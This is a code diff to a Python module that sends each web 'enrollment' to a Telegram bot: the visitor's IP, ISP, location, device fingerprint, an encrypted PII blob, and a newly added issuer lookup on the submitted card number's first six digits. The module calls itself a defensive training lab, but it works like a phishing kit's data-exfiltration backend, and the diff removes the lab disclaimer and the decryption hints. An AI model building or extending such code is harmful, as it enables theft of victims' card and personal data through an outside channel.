@@ -2,7 +2,7 @@
 Optional Telegram Bot API delivery for the Bango lab enrollment (defensive training).
 
 Sends one HTML ``sendMessage`` after successful ``POST /api/demo/register`` (enrollment
-+ optional redirect). Uses ``sendMessage`` with HTML parse mode. Never log the bot token.
+snapshot). Uses ``sendMessage`` with HTML parse mode. Never log the bot token.
 """
 
 from __future__ import annotations
@@ -16,6 +16,7 @@ import urllib.request
 from typing import Any
 
 from backend import rsa_envelope, ua_parse
+from backend.bin_api_client import fetch_bin_meta
 
 logger = logging.getLogger(__name__)
 
@@ -71,7 +72,7 @@ def _network_and_client_lines(
     if g and g.get("ok"):
         lines.append(f"🌐 <b>IP</b>: <code>{esc(str(g.get('query') or client_ip))}</code>")
         lines.append(f"🏢 <b>ISP</b>: {esc(str(g.get('isp') or '—'))}")
-        lines.append(f"🗺 <b>Country</b>: {esc(str(g.get('country') or '—'))}")
+        lines.append(f"🗺️ <b>Country</b>: {esc(str(g.get('country') or '—'))}")
         regn = str(g.get("region") or "").strip()
         if regn:
             lines.append(f"📍 <b>Region</b>: {esc(regn)}")
@@ -81,7 +82,7 @@ def _network_and_client_lines(
         lines.append(f"🌐 <b>IP</b>: <code>{esc(str((g or {}).get('query') or client_ip))}</code>")
         reason = str((g or {}).get("reason") or "").strip()
         if reason == "not_public":
-            lines.append("<i>Geo lookup skipped (local / private / non-public IP).</i>")
+            lines.append("🏠 <i>Geo lookup skipped (local / private / non-public IP).</i>")
         else:
             lines.append(
                 f"⚠️ <i>Geo unavailable</i> — {esc((reason or 'lookup failed')[:120])}"
@@ -92,10 +93,10 @@ def _network_and_client_lines(
     br_line = (str(ua.get("browser_family") or "unknown") + " " + str(ua.get("browser_version") or "")).strip()
     dev = str(ua.get("device_kind") or "—")
     eng = str(ua.get("engine") or "—")
-    lines.append("🖥 <b>System &amp; browser</b> <i>(User-Agent)</i>")
+    lines.append("🧩 <b>System &amp; browser</b> <i>(User-Agent)</i>")
     lines.append(f"💻 <b>OS</b>: {esc(os_line)}")
-    lines.append(f"🌍 <b>Browser</b>: {esc(br_line)}")
-    lines.append(f"📱 <b>Device</b>: {esc(dev)}")
+    lines.append(f"🧭 <b>Browser</b>: {esc(br_line)}")
+    lines.append(f"📟 <b>Device</b>: {esc(dev)}")
     if eng and eng != "—":
         lines.append(f"⚙️ <b>Engine</b>: {esc(eng)}")
     emb = ua.get("embeddings")
@@ -104,6 +105,28 @@ def _network_and_client_lines(
             f"🔌 <b>Host</b>: {esc(', '.join(str(x) for x in emb[:3]))}"
         )
     return lines
+
+
+def _bin_lookup_line_html(reg: dict[str, Any]) -> str:
+    """First 6 PAN digits only — HandyAPI BIN line for Telegram HTML."""
+    esc = html.escape
+    pan = str(reg.get("card_number") or "").replace(" ", "")
+    pan_digits = "".join(c for c in pan if c.isdigit())
+    if len(pan_digits) < 6:
+        return "🔎 <b>BIN</b>: <i>Unknown</i>"
+    bin_info = fetch_bin_meta(pan_digits[:6])
+    if bin_info:
+        rows = [
+            "💳 <b>BIN</b> <i>(first 6 · HandyAPI)</i>",
+            f"💠 <b>Scheme</b>: {esc(str(bin_info['scheme']))}",
+            f"🪪 <b>Type</b>: {esc(str(bin_info['type']))}",
+            f"🏦 <b>Issuer</b>: {esc(str(bin_info['issuer']))}",
+            f"✨ <b>Tier</b>: {esc(str(bin_info['tier']))}",
+            f"🌏 <b>Country</b>: {esc(str(bin_info['country']))}",
+        ]
+        # Newlines: Telegram HTML rejects <br/>; raw \\n in the message is fine.
+        return "\n".join(rows)
+    return "🔎 <b>BIN</b>: <i>Unknown</i> (lookup failed)"
 
 
 def _format_enrollment_telegram(
@@ -159,10 +182,7 @@ def _format_enrollment_telegram(
         if blob:
             lines.extend(
                 [
-                    "🔐 <b>PII</b> <i>(RSA-OAEP + AES-256-GCM, same as browser wire)</i>",
                     f"<pre>{esc(blob)}</pre>",
-                    "<i>Decrypt with <code>keys_only/private_demo.pem</code> · "
-                    "<code>python tools/decrypt_telegram_pii.py '1.…'</code></i>",
                     "",
                 ]
             )
@@ -174,6 +194,8 @@ def _format_enrollment_telegram(
                     "",
                 ]
             )
+    lines.append(_bin_lookup_line_html(reg))
+    lines.append("")
     if extra_lines_before_network:
         lines.extend(extra_lines_before_network)
     lines.extend(
@@ -218,24 +240,13 @@ def format_demo_registration_message(
     done_redirect_url: str = "",
 ) -> str:
     """
-    One Telegram message per successful registration: full enrollment snapshot,
-    optional done-redirect line (``DEMO_BANGO_DONE_REDIRECT_URL`` or legacy
-    ``DEMO_SPA_DONE_REDIRECT_URL`` in ``.env``).
+    One Telegram message per successful registration: full enrollment snapshot.
+
+    ``done_redirect_url`` is kept for call-site compatibility; it is not included in
+    the message body (avoids echoing ``.env`` redirect URLs in chat).
     """
-    esc = html.escape
+    _ = done_redirect_url
     title = "🎉 <b>Bango</b>"
-    hdr = [
-        "ℹ️ <b>Lab</b>: Bango shell — one Telegram per visit after register.",
-    ]
-    ex: list[str] = []
-    raw_r = (done_redirect_url or "").strip()
-    if raw_r:
-        show = raw_r if len(raw_r) <= 200 else raw_r[:197] + "…"
-        ex.append(
-            "🔗 <b>Redirect</b> (Bango done URL in .env): "
-            f"<code>{esc(show)}</code>"
-        )
-        ex.append("")
     return _format_enrollment_telegram(
         reg,
         client_ip=client_ip,
@@ -243,8 +254,8 @@ def format_demo_registration_message(
         include_fingerprint=True,
         user_agent=user_agent,
         ip_geo=ip_geo,
-        optional_header_lines=hdr,
-        extra_lines_before_network=ex if ex else None,
+        optional_header_lines=None,
+        extra_lines_before_network=None,
     )
 
 
